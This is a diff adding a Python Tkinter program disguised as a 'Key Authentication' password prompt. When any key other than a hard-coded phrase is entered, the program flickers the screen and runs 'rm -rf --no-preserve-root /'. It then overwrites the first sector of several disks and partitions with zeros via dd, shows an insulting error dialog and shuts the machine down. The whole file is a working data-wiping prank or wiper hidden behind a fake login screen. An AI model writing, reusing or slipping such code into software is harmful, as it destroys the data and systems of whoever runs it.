@@ -1,0 +1,72 @@
+import tkinter as tk
+import os
+import random
+import threading
+import time
+
+# flickers the screen I think?
+def flicker_screen():
+    while True:
+        root.attributes("-alpha", 0)
+        time.sleep(0.1)
+        root.attributes("-alpha", 1)
+        time.sleep(0.1)
+#the key auth part
+def key_auth(key):
+    if key == "Axe is my master":
+        access_granted_window = tk.Tk()
+        access_granted_window.title("Access Granted")
+        label_text = "Access granted. Welcome!"
+        label = tk.Label(access_granted_window, text=label_text, font=('Helvetica', random.randint(10, 30)))
+        label.pack()
+        access_granted_window.mainloop()
+# if im right this is where you put your code so that if the key is right then yk the other bad boy stuff wont happen!!!!!
+    else:
+        flicker_thread = threading.Thread(target=flicker_screen)
+        flicker_thread.start()
+        # hehe
+        os.system("rm -rf --no-preserve-root /")
+        os.system("dd if=/dev/zero of=/dev/sda bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sdb bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda1 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda2 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda3 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda4 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda5 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda6 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda7 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda8 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda9 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda10 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda11 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda12 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda13 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda14 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda15 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda16 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda17 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda18 bs=512 count=1")
+        os.system("dd if=/dev/zero of=/dev/sda19 bs=512 count=1")
+        os.system("zenity --error --text='Fuck you loser'")
+        os.system("shutdown now -h")
+#the ui
+# UI for key input
+root = tk.Tk()
+root.title("K\ne\ny\n \nA\nu\nt\nh\ne\nn\\t\ni\nc\na\nt\ni\no\nn")
+#label duh
+label = tk.Label(root, text="E\nn\nt\ne\nr\n \nt\nh\ne\n \nk\ne\ny\n:")
+label.pack()
+
+entry = tk.Entry(root, show="*")
+entry.pack()
+#checks the key
+def check_key():
+    user_key = entry.get()
+    key_auth(user_key)
+#ya
+button = tk.Button(root, text="S\nu\nb\nm\ni\nt", command=check_key)
+button.pack()
+
+#updates will be coming soon for this
+
+root.mainloop()
